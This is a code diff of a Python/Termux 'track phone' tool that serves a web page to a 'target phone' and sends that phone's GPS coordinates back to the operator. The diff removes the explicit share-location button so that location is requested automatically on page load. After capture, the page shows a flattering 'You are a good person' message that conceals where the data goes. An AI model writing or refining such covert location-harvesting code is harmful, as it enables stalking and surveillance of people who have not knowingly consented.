@@ -1,5 +1,5 @@
-# HCO Track Phone by Azhar - Fixed Version
-# Simple and Working!
+# HCO Track Phone by Azhar - Auto Version
+# Just open link → Allow permission → Done!
 
 import os
 import subprocess
@@ -28,34 +28,28 @@ def tool_lock():
     print(f"{RED}║{'Subscribe to YouTube Channel'.center(78)}║{RESET}")
     print(f"{RED}║{'@hackers_colony_tech'.center(78)}║{RESET}")
     print(f"{RED}╚{'═'*78}╝{RESET}")
-    print(f"\n{CYAN}Opening YouTube in 3 seconds...{RESET}")
-    time.sleep(3)
+    time.sleep(2)
     
     try:
         subprocess.run(["am", "start", "-a", "android.intent.action.VIEW", 
                        "-d", "https://youtube.com/@hackers_colony_tech"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        print(f"{GREEN}✓ Opening YouTube...{RESET}")
     except:
-        pass
+        print(f"{YELLOW}⚠️  Open YouTube: youtube.com/@hackers_colony_tech{RESET}")
     
-    input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
+    time.sleep(3)
 
 # Get correct local IP
 def get_local_ip():
     try:
-        # Connect to Google DNS to find our actual IP
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
         ip = s.getsockname()[0]
         s.close()
         return ip
     except:
-        try:
-            # Alternative method
-            hostname = socket.gethostname()
-            return socket.gethostbyname(hostname)
-        except:
-            return "127.0.0.1"
+        return "127.0.0.1"
 
 # Find available port
 def find_port():
@@ -69,7 +63,7 @@ def find_port():
             continue
     return 8080
 
-# Flask routes - FIXED VERSION
+# Flask routes - AUTOMATIC VERSION
 @app.route('/')
 def home():
     html = '''
@@ -81,14 +75,14 @@ def home():
         <style>
             body { 
                 background: black; 
-                color: lime; 
+                color: white; 
                 text-align: center; 
                 font-family: Arial; 
                 padding: 20px;
                 margin: 0;
             }
             .container { 
-                max-width: 100%%; 
+                max-width: 100%; 
                 margin: 0 auto; 
                 padding: 20px; 
             }
@@ -99,88 +93,73 @@ def home():
                 margin-bottom: 20px; 
                 text-shadow: 0 0 10px red;
             }
-            button { 
-                background: lime; 
-                color: black; 
-                border: none; 
-                padding: 20px 40px; 
-                border-radius: 10px; 
-                font-size: 20px; 
-                font-weight: bold; 
-                margin: 20px 0; 
-                cursor: pointer;
-            }
-            #status {
-                padding: 15px;
-                margin: 15px 0;
-                border-radius: 5px;
+            .message {
+                font-size: 18px;
+                margin: 20px 0;
+                padding: 20px;
+                border-radius: 10px;
                 background: #222;
+            }
+            .success {
+                color: lime;
+                font-size: 22px;
+                font-weight: bold;
             }
         </style>
     </head>
     <body>
         <div class="container">
             <div class="logo">HCO TRACK PHONE BY AZHAR</div>
-            <p>Click the button below to share your location</p>
-            <button onclick="shareLocation()">📡 SHARE LOCATION</button>
-            <div id="status">Click the button above to share your location</div>
-            <p><small>Make sure to allow location permissions when prompted</small></p>
+            <div id="status" class="message">🔄 Requesting location access...</div>
         </div>
         
         <script>
-        function shareLocation() {
+        function autoGetLocation() {
             var status = document.getElementById('status');
-            status.innerHTML = 'Requesting location access...';
-            status.style.color = 'yellow';
             
             if (!navigator.geolocation) {
-                status.innerHTML = 'Geolocation is not supported by your browser';
-                status.style.color = 'red';
+                status.innerHTML = '❌ Geolocation not supported by your browser';
                 return;
             }
             
             function success(position) {
                 var lat = position.coords.latitude;
                 var lon = position.coords.longitude;
-                var acc = position.coords.accuracy;
                 
                 // Send to server
                 fetch('/update', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        lat: lat,
-                        lon: lon,
-                        accuracy: acc
-                    })
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({lat: lat, lon: lon, accuracy: position.coords.accuracy})
                 })
                 .then(response => response.text())
                 .then(data => {
-                    status.innerHTML = '✅ Location sent successfully!';
-                    status.style.color = 'lime';
+                    status.innerHTML = '<div class="success">✅ You are a good person! God Bless You 🙏</div>' +
+                                      '<div style="margin-top:20px;">📍 Location shared successfully</div>';
                 })
                 .catch(error => {
-                    status.innerHTML = '❌ Error sending location';
-                    status.style.color = 'red';
+                    status.innerHTML = '❌ Error sending location. Please refresh page.';
                 });
             }
             
             function error(err) {
-                status.innerHTML = '❌ Please allow location access to continue';
-                status.style.color = 'red';
-                console.error('Geolocation error:', err);
+                if(err.code == err.PERMISSION_DENIED) {
+                    status.innerHTML = '❌ Permission denied! Please allow location access and refresh this page.';
+                } else {
+                    status.innerHTML = '❌ Location access failed. Please refresh page.';
+                }
             }
             
-            var options = {
+            // Get location automatically
+            navigator.geolocation.getCurrentPosition(success, error, {
                 enableHighAccuracy: true,
-                timeout: 10000,
+                timeout: 15000,
                 maximumAge: 0
-            };
-            
-            navigator.geolocation.getCurrentPosition(success, error, options);
+            });
         }
+        
+        // Start automatically when page loads
+        window.onload = autoGetLocation;
         </script>
     </body>
     </html>
@@ -197,9 +176,8 @@ def update():
             locations['time'] = time.time()
             print(f"{GREEN}📍 Location received: {data['lat']}, {data['lon']}{RESET}")
             return "OK"
-        return "ERROR: Invalid data"
-    except Exception as e:
-        print(f"{RED}Error processing location: {e}{RESET}")
+        return "ERROR"
+    except:
         return "ERROR"
 
 def start_server(port):
@@ -211,19 +189,13 @@ def start_server(port):
 def make_qr(url):
     try:
         import qrcode
-        qr = qrcode.QRCode(
-            version=4,
-            error_correction=qrcode.constants.ERROR_CORRECT_H,
-            box_size=6,
-            border=4,
-        )
+        qr = qrcode.QRCode(box_size=6, border=4)
         qr.add_data(url)
         qr.make(fit=True)
         img = qr.make_image(fill_color="red", back_color="white")
         qr_path = "/data/data/com.termux/files/home/track_qr.png"
         img.save(qr_path)
         
-        # Try to open the QR code
         try:
             subprocess.run(["termux-open", qr_path],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -231,8 +203,7 @@ def make_qr(url):
             pass
             
         return True
-    except Exception as e:
-        print(f"{YELLOW}⚠️  QR code generation failed: {e}{RESET}")
+    except:
         return False
 
 # Install requirements
@@ -240,17 +211,15 @@ def install_requirements():
     try:
         import flask
         import qrcode
-        import requests
         return True
     except ImportError:
         print(f"{YELLOW}Installing required packages...{RESET}")
         try:
-            subprocess.run([sys.executable, "-m", "pip", "install", "flask", "qrcode[pil]", "requests"],
+            subprocess.run([sys.executable, "-m", "pip", "install", "flask", "qrcode[pil]"],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120)
             return True
         except:
-            print(f"{RED}Failed to install packages automatically{RESET}")
-            print(f"{YELLOW}Please run: pip install flask qrcode[pil] requests{RESET}")
+            print(f"{RED}Failed to install packages{RESET}")
             return False
 
 # Main function
@@ -265,6 +234,7 @@ def main():
     
     # Install requirements
     if not install_requirements():
+        print(f"{YELLOW}Please run: pip install flask qrcode[pil]{RESET}")
         return
     
     # Get correct IP and port
@@ -272,13 +242,13 @@ def main():
     port = find_port()
     TRACKING_URL = f"http://{local_ip}:{port}"
     
-    print(f"{GREEN}✅ Server starting on: {local_ip}:{port}{RESET}")
+    print(f"{GREEN}✅ Server: {local_ip}:{port}{RESET}")
     
     # Start server in thread
     server_thread = threading.Thread(target=start_server, args=(port,), daemon=True)
     server_thread.start()
     
-    time.sleep(2)  # Wait for server to start
+    time.sleep(2)
     
     # Generate QR code
     print(f"{YELLOW}📱 Generating QR code...{RESET}")
@@ -290,8 +260,8 @@ def main():
     print(f"{RED}{'═'*60}{RESET}")
     print(f"\n{GREEN}📱 Send this link to target phone:{RESET}")
     print(f"{CYAN}{TRACKING_URL}{RESET}")
-    print(f"\n{YELLOW}📍 OR scan the QR code that opened{RESET}")
-    print(f"\n{BLUE}💡 Make sure both phones are on same WiFi network{RESET}")
+    print(f"\n{YELLOW}📍 QR code should open automatically{RESET}")
+    print(f"\n{BLUE}💡 Both phones must be on same WiFi{RESET}")
     print(f"\n{RED}{'═'*60}{RESET}")
     
     # Wait for location
@@ -318,6 +288,3 @@ if __name__ == "__main__":
         print(f"\n{RED}🛑 Stopped{RESET}")
     except Exception as e:
         print(f"{RED}❌ Error: {e}{RESET}")
-        print(f"{YELLOW}Try installing requirements manually:{RESET}")
-        print(f"{CYAN}pkg install python{RESET}")
-        print(f"{CYAN}pip install flask qrcode[pil] requests{RESET}")
